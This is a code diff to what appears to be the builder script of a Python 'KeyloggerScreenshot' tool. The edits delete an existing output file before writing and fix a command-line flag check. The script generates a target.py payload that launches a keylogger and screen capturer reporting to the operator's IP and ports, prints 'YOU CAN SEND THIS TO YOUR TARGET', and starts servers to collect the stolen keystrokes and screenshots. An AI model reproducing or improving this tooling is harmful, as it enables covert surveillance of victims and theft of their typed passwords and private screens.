@@ -2,6 +2,7 @@ import KeyloggerScreenshot as ks
 import sys
 import threading
 import random
+import os
 
 gui = """
     __ __              __                                 _____                                       __            __ 
@@ -72,6 +73,9 @@ try:
                     if "-" in filename:
                         filename = "target.py"
 
+                    if os.path.exists(filename):
+                        os.remove(filename)
+
                     with open(f"{filename}", "a+") as file:
                         file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener},ip, {port_time}, duration_in_seconds={seconds}) \nkey_client.start()")
                     print(f"{filename.upper()} has been created")
@@ -80,6 +84,7 @@ try:
                     with open("target.py", "a+") as file:
                         file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener},ip, {port_time}, duration_in_seconds={seconds}) \nkey_client.start()")
                     print("TARGET.PY HAS BEEN CREATED YOU CAN SEND THIS TO YOUR TARGET")
+
             server_photos = ks.ServerPhotos(ipaddress, port_photos)
 
             server_keylogger = ks.ServerKeylogger(ipaddress, port_keylogger)
@@ -103,7 +108,7 @@ try:
         except IndexError:
             print("YOU FORGET TO INSERT YOUR IP")
 
-    elif "-aip" in lst and "-help" not in lst:
+    elif "-aip" not in lst and "-help" not in lst:
         print("PLEASE INSERT YOUR IP WITH -aip")
 
     if "-help" in lst:
